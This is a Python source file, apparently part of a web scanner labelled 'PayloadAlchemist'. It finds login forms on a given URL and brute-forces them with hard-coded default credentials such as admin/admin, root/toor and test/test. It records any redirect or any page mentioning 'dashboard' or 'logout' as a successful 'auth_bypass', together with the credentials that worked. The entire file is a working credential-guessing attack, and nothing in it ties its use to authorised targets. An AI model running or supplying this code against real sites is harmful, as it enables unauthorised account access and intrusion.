import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

COMMON_USERNAMES = ["admin", "root", "user", "test"]
COMMON_PASSWORDS = ["admin", "password", "123456", "root", "toor", "test"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (PayloadAlchemist)"
}

def find_login_forms(url):
    try:
        res = requests.get(url, headers=HEADERS, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")

        login_forms = []
        for form in forms:
            inputs = form.find_all("input")
            has_user = any(inp.get("name") and "user" in inp.get("name", "").lower() for inp in inputs)
            has_pass = any(inp.get("name") and "pass" in inp.get("name", "").lower() for inp in inputs)
            if has_user and has_pass:
                login_forms.append(form)
        return login_forms

    except Exception:
        return []

def brute_force_login(url):
    findings = []
    login_forms = find_login_forms(url)

    if not login_forms:
        return []

    for form in login_forms:
        action = form.get("action") or url
        method = form.get("method", "post").lower()
        inputs = form.find_all("input")
        form_url = urljoin(url, action)

        user_field = next((inp.get("name") for inp in inputs if inp.get("name") and "user" in inp.get("name", "").lower()), None)
        pass_field = next((inp.get("name") for inp in inputs if inp.get("name") and "pass" in inp.get("name", "").lower()), None)

        if not user_field or not pass_field:
            continue

        for username in COMMON_USERNAMES:
            for password in COMMON_PASSWORDS:
                data = {
                    user_field: username,
                    pass_field: password
                }
                try:
                    if method == "post":
                        r = requests.post(form_url, headers=HEADERS, data=data, timeout=5, allow_redirects=False)
                    else:
                        r = requests.get(form_url, headers=HEADERS, params=data, timeout=5, allow_redirects=False)

                    if r.status_code in [302, 301] or "dashboard" in r.text.lower() or "logout" in r.text.lower():
                        findings.append({
                            "type": "auth_bypass",
                            "url": form_url,
                            "credentials": f"{username}:{password}"
                        })
                        return findings  # Stop on first success
                except:
                    continue

    return findings
